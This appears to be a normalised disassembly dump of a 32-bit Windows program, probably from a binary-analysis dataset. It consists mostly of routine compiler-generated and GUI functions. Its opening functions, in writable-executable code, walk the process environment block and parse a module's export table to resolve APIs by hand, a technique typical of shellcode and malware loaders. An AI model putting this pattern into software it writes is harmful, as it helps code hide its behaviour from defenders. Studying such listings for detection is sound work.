add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_4f9110
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4f9140
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_401000
retn
sub_401010
mov eax [ esp + 0x8 ]
mov cl [ eax ]
mov edx [ esp + 0x4 ]
mov [ edx ] cl
retn
sub_401050
mov ecx [ ecx ]
test ecx ecx
je r-xdata
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_4011d0
push ecx
mov al [ esp + 0x3 ]
pop ecx
retn
sub_401295
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call sub_4b573e
mov [ ebp + 0x8 ] eax
add esp 0x4
mov eax r-xdata
retn
sub_4014d0
mov ecx [ ecx ]
jmp sub_401420
sub_401510
mov eax ecx
xor ecx ecx
mov edx 0xf
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x4 ] cl
mov [ eax + 0x6c ] edx
mov [ eax + 0x68 ] ecx
mov [ eax + 0x58 ] cl
retn
sub_4019f0
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_402b5b
mov ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] ecx
mov eax r-xdata
retn
sub_403110
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_402c00
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
j_sub_402040
jmp sub_402040
sub_403200
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push ecx
push edx
call sub_402270
add esp 0x10
retn 0x8
sub_4038a0
mov eax ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_4043f0
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov [ esi ] ecx
call sub_404310
mov eax esi
pop esi
retn 0x4
sub_405028
mov eax r-xdata
retn
sub_40534e
mov eax sub_405354
retn
sub_405a76
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_405a82
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_406225
mov eax r-xdata
retn
sub_40659a
mov eax r-xdata
retn
sub_406928
mov eax r-xdata
retn
sub_406b01
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] ecx
mov eax r-xdata
retn
j_sub_403b20
jmp sub_403b20
sub_408268
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x124 ]
mov [ eax + 0x9c ] ecx
lea ecx [ ebp - 0x24 ]
call sub_402bc0
mov eax [ ebp - 0x14 ]
test eax eax
jne r-xdata
mov eax r-xdata
retn
mov eax r-xdata
retn
sub_409551
mov eax sub_409557
retn
sub_40a022
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
mov eax sub_40a03a
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40a03a
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a310
mov eax 0x2
retn 0x4
sub_40a320
retn 0xc
sub_40a330
mov [ ecx ] r--data
retn
sub_40a340
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_40a360
mov ecx [ ecx ]
test ecx ecx
je r-xdata
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
sub_40a3d0
mov eax ecx
mov [ eax ] 0x76
retn
sub_40a3e0
mov ax [ ecx ]
cmp ax 0x66
je r-xdata
mov eax 0x1
retn
cmp ax 0x69
je r-xdata
xor eax eax
retn
sub_40a430
cmp [ ecx ] 0x69
jne r-xdata
fld [ ecx + 0x4 ]
retn
fild [ ecx + 0x4 ]
retn
sub_40a440
mov [ ecx ] r--data
retn
sub_40a450
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_40a470
mov eax 0x1
retn 0x4
sub_40a480
mov [ ecx ] r--data
retn
sub_40a490
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_40a4b0
mov ecx [ ecx ]
test ecx ecx
je r-xdata
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
sub_40a710
push ecx
mov ecx [ ecx + 0x45c ]
test ecx ecx
mov [ esp ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] ecx
pop ecx
retn 0x4
inc [ ecx ]
sub_40a900
xor al al
retn 0x8
sub_40a910
retn 0x1c
sub_40a920
mov eax [ esp + 0x4 ]
add eax 0x8
retn 0x4
sub_40a930
push esi
mov esi ecx
call sub_40a950
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_40ab70
retn 0x14
sub_40ab80
push esi
mov esi ecx
call sub_40aba0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_40ac00
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_40ac40
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push eax
call sub_4b66ed
pop ecx
j_sub_4b573e
jmp sub_4b573e
sub_40acb0
mov eax rw-data
retn
j_sub_44f5f0
jmp sub_44f5f0
sub_40b100
cmp [ ecx ] 0x63
jne r-xdata
retn
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
sub_40bb20
mov ecx rw-data
jmp sub_40b860
sub_40bb30
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_417680
add esp 0x14
retn 0xc
sub_40bb80
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_45f6a0
add esp 0x14
retn 0xc
sub_40bc60
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_417b90
add esp 0x14
retn 0xc
sub_40bce0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push ecx
push edx
call sub_40bbe0
add esp 0x10
retn 0x8
sub_40bd00
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push ecx
push edx
call sub_40bc20
add esp 0x10
retn 0x8
sub_40bd50
push esi
mov esi ecx
call sub_40bd70
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_40c360
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_402c00
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_40d312
mov edx [ ebp - 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_40d3af
mov ecx [ ebp - 0x14 ]
call sub_462cf0
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_40d590
mov ecx [ ebp - 0x14 ]
call sub_40bf40
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_40d7b2
mov ecx [ ebp - 0x14 ]
call sub_462cf0
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_40dc70
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_40c470
add esp 0x14
retn 0xc
sub_40dd60
mov ecx [ ebp - 0x14 ]
call sub_403ab0
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_413a40
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_418910
add esp 0x14
retn 0xc
sub_413b6e
mov ecx [ ebp - 0x14 ]
call sub_413a90
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_414f00
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_414dd0
add esp 0x14
retn 0xc
j_sub_414f80
jmp sub_414f80
sub_4156c0
xor al al
retn 0xc
sub_4156d0
retn 0x8
sub_4156e0
retn 0x4
sub_4157c0
xor eax eax
retn 0x8
sub_4157d0
push ecx
mov eax [ esp + 0xc ]
mov [ esp ] 0x0
mov [ eax ] 0x76
pop ecx
retn 0xc
sub_415f40
mov eax ecx
mov ecx [ esp + 0x4 ]
test ecx ecx
mov [ eax ] 0x63
mov [ eax + 0x4 ] ecx
je r-xdata
retn 0x4
inc [ ecx + 0x4 ]
sub_4167c0
mov eax [ esp + 0x4 ]
sub eax 0x2
je r-xdata
mov eax [ ecx + 0x18 ]
retn 0x4
sub eax 0x2
je r-xdata
mov eax [ ecx + 0x1c ]
retn 0x4
mov eax [ ecx + 0x8 ]
retn 0x4
sub_416af0
push esi
mov esi ecx
call sub_415540
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_417270
mov eax ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn
sub_41b8a0
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_41b8c0
mov eax [ ecx + 0x10 ]
mov edx [ ecx + 0x14 ]
retn
sub_41b8d0
mov eax [ ecx + 0x8 ]
mov edx [ ecx + 0xc ]
retn
sub_41b8e0
mov eax [ ecx + 0x18 ]
retn
sub_41b8f0
mov eax ecx
retn
sub_41b940
mov eax 0x1
retn
sub_41baf0
push esi
mov esi ecx
call sub_41bb10
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_41bb10
mov [ ecx ] r--data
retn
sub_41bbb0
push esi
mov esi ecx
mov eax [ esi + 0x3c ]
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x3c ] 0xffffffff
pop esi
retn
push eax
call [ CloseHandle@IAT ]
sub_41c000
push esi
mov esi ecx
call sub_41c020
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_41c167
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ ebp - 0x24 ]
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] ecx
call sub_4b5bd2
int3
sub_420cd0
push 0xc
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] eax
retn
mov [ ecx ] eax
sub_420e00
push esi
mov esi ecx
call sub_420cd0
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn
sub_427dc2
mov [ ebp - 0x3c ] 0x0
mov eax sub_427dcf
retn
sub_428bd0
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
jmp sub_45f170
sub_428c20
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
push 0x501
push eax
call [ PostMessageA@IAT ]
sub_429940
mov ecx [ ebp - 0x14 ]
call sub_462cf0
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_42b6b0
mov eax ecx
mov [ eax + 0x14 ] 0x0
retn
sub_42b720
push esi
mov esi [ esp + 0x8 ]
add esi 0x4
push esi
call [ InterlockedIncrement@IAT ]
mov eax [ esi ]
pop esi
retn 0x4
sub_42b740
mov eax 0x80004001
retn 0xc
sub_42b750
mov eax 0x80040003
retn 0x14
sub_42b760
mov eax 0x80040003
retn 0x8
sub_42b890
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ esi + 0x8 ]
push eax
call j_sub_4b66ed
add esp 0x4
mov [ esi + 0x8 ] 0x0
pop esi
retn
sub_42b8f0
add ecx 0x8
jmp sub_42b7d0
sub_42bbb0
push esi
mov esi [ esp + 0x8 ]
add esi 0x8
push esi
call [ InterlockedIncrement@IAT ]
mov eax [ esi ]
pop esi
retn 0x4
sub_42bbd0
mov eax 0x40102
retn 0x8
sub_42bc90
xor eax eax
retn 0x4
sub_42c380
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_4b4da0
add esp 0x4
mov [ rw-data ] 0x0
sub_42c9a0
mov eax [ esp + 0x4 ]
push 0x0
push eax
call sub_42c920
retn 0x4
sub_42da20
mov eax [ rw-data ]
push 0x0
push sub_42d360
push eax
push 0xc25
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
retn
sub_42da90
mov eax [ esp + 0x4 ]
mov [ eax + 0x10 ] 0x0
xor eax eax
retn 0x4
sub_42dd20
mov eax [ rw-data ]
retn
sub_42e0f0
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x4 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
retn 0x4
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
mov eax 0x1
retn 0x4
sub_42e110
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x11 ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x11 ]
test dl dl
je r-xdata
sub_42e130
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x11 ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x11 ]
test dl dl
je r-xdata
sub_430040
mov eax [ esp + 0x4 ]
push 0x0
push sub_42f970
push eax
push 0xc1e
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
retn
sub_430c10
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_430c80
mov eax [ esp + 0x4 ]
push esi
push eax
call [ DestroyWindow@IAT ]
mov esi [ esp + 0xc ]
call sub_430c20
pop esi
retn
sub_431330
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0x10 ]
push sub_430fe0
push esi
push 0x1030
push eax
call [ SendMessageA@IAT ]
mov ecx [ esp + 0xc ]
mov [ ecx + 0xc ] esi
pop esi
retn
sub_432840
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x2d ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x2d ]
test dl dl
je r-xdata
sub_432860
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x2d ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x2d ]
test dl dl
je r-xdata
sub_433722
mov edx [ ebp - 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_434e80
mov edx ecx
push edi
xor eax eax
mov ecx 0x4000
mov edi edx
[ edi ]
mov [ edx + 0x10000 ] eax
mov [ edx + 0x10004 ] edx
mov [ edx + 0x10008 ] edx
mov eax edx
pop edi
retn
sub_434eb0
mov eax [ ecx + 0x10000 ]
test eax eax
je r-xdata
retn
push eax
call j_sub_4b66ed
pop ecx
sub_435490
push r--data
call sub_435460
mov eax [ esp + 0x4 ]
push eax
call sub_435460
mov [ esp + 0x4 ] r--data
jmp sub_435460
sub_435d10
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push 0x0
push 0x0
push 0x1401
push eax
call [ SendMessageA@IAT ]
mov eax 0x1
retn
sub_435d40
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push eax
call [ DestroyWindow@IAT ]
mov eax 0x1
retn
sub_438500
push esi
mov esi ecx
call sub_44fb50
mov eax esi
pop esi
retn
j_sub_44f660
jmp sub_44f660
sub_439260
push esi
mov esi ecx
call sub_450270
mov [ esi + 0x10028 ] eax
mov eax [ esp + 0x8 ]
push eax
mov ecx esi
call sub_439180
pop esi
retn 0x4
sub_439d00
mov eax [ ecx + 0x42c ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x8 ]
test eax eax
jg r-xdata
jmp sub_439a90
sub_43d290
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
and eax 0xfffffdff
or eax 0x4000
mov ecx rw-data
mov [ rw-data ] eax
call sub_401420
mov eax 0x80004005
retn
sub_43deb7
mov eax [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
mov eax r-xdata
retn
sub_43dfc6
mov eax [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
mov eax r-xdata
retn
sub_43e1ac
mov ecx [ ebp + 0x34 ]
mov [ ebp + 0x30 ] ecx
mov eax r-xdata
retn
sub_43ea5d
mov edx [ ebp + 0xc ]
mov [ ebp + 0x10 ] edx
mov eax r-xdata
retn
sub_43ee2d
lea edx [ ebp - 0x1c84 ]
push edx
call [ rw-data ]
mov eax r-xdata
retn
sub_4408bc
lea eax [ ebp - 0x1bb8 ]
push eax
call [ rw-data ]
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov eax r-xdata
retn
mov ecx [ ebp - 0x1c ]
call sub_43d760
mov eax r-xdata
retn
sub_440a58
mov eax [ ebp + 0x24 ]
mov [ ebp + 0x18 ] eax
mov eax r-xdata
retn
sub_440e86
mov ecx [ ebp + 0x24 ]
mov [ ebp + 0x18 ] ecx
mov eax r-xdata
retn
sub_445a10
mov eax [ esp + 0x4 ]
push 0x0
push sub_444dc0
push eax
push 0x154
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
retn
sub_447be0
mov eax [ esp + 0x4 ]
push 0x0
push sub_446430
push eax
push 0xc22
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
retn
sub_447e10
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x29 ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x29 ]
test dl dl
je r-xdata
sub_447e30
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x29 ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x29 ]
test dl dl
je r-xdata
sub_4482ab
mov edx [ ebp - 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
xor ebx ebx
push ebx
push ebx
call sub_4b5bd2
int3
sub_449020
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_448640
add esp 0x14
retn 0xc
j_sub_448e30
jmp sub_448e30
sub_4495c0
mov ecx [ ebp - 0x14 ]
call sub_448e30
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_44b4d4
mov eax sub_44b4da
retn
sub_44b748
mov [ ebp + 0x8 ] 0x0
mov eax sub_44b755
retn
sub_44bce3
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax r-xdata
retn
sub_44f660
call sub_44f610
mov eax [ esp + 0x4 ]
mov [ ecx + 0x1000c ] eax
mov [ ecx + 0x10010 ] eax
retn 0x4
sub_44fb30
fld [ ecx + 0x10008 ]
retn
sub_44fb40
mov al [ ecx + 0x10008 ]
retn
sub_44fb50
call sub_44f610
mov eax ecx
retn
sub_451530
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push eax
push ecx
call [ GetClientRect@IAT ]
retn
sub_45cd10
mov eax [ rw-data ]
fld [ eax * 4 + rw-data ]
retn
sub_45d900
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x89 ]
test dl dl
jne r-xdata
retn
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x89 ]
test dl dl
je r-xdata
sub_45d930
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x89 ]
test dl dl
jne r-xdata
retn
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x89 ]
test dl dl
je r-xdata
sub_45da70
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x15 ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x15 ]
test dl dl
je r-xdata
sub_45daf0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x15 ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x15 ]
test dl dl
je r-xdata
sub_45f7f0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
retn 0x4
sub_460ec5
mov eax [ ebp - 0x20 ]
mov [ ebp + 0x10 ] eax
mov eax r-xdata
retn
sub_461590
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_453050
add esp 0x14
retn 0xc
sub_462d50
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push ecx
push edx
call sub_461b30
add esp 0x10
retn 0x8
sub_468e22
mov edx [ ebp - 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_469e6f
mov edx [ ebp - 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_46a3f0
mov ecx [ ebp - 0x14 ]
call sub_462cf0
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_46a490
mov ecx [ ebp - 0x14 ]
call sub_462cf0
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_46a6f0
mov ecx [ ebp - 0x14 ]
call sub_467ee0
push 0x0
push 0x0
call sub_4b5bd2
int3
sub_46b510
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_465ef0
add esp 0x14
retn 0xc
sub_46b620
mov ecx [ ebp - 0x14 ]
call sub_403b20
push 0x0
push 0x0
call sub_4b5bd2
int3
j_sub_46b1b0
jmp sub_46b1b0
sub_4813e0
mov eax [ esp + 0x4 ]
push 0x0
push sub_47fd30
push eax
push 0x129
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
mov eax 0x1
retn
sub_489430
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push eax
push 0x0
push ecx
push 0x1b
call sub_486df0
add esp 0x10
retn
sub_497e9d
add al 0x0
add [ eax ] al
add [ ecx ] al
add al [ ebx ]
add [ eax - 0x6f6f6f70 ] dl
nop
nop
nop
nop
nop
sub_499a7d
mov ecx [ ebp - 0x24 ]
mov edx [ ebp + 0x8 ]
push 0x0
push r--data
push ecx
push edx
call [ MessageBoxA@IAT ]
mov eax sub_499a98
retn
sub_4a3c90
mov ecx [ esp + 0x4 ]
jmp sub_401ae0
sub_4a3ee0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx rw-data
call sub_401e80
retn
j_sub_403b70
jmp sub_403b70
sub_4a6ae0
mov ecx [ ebp - 0x14 ]
call sub_403b70
push 0x0
push 0x0
call sub_4b5bd2
int3
j_sub_4a7190
jmp sub_4a7190
sub_4a896e
mov edx [ ebp - 0x74 ]
push r--data
push edx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
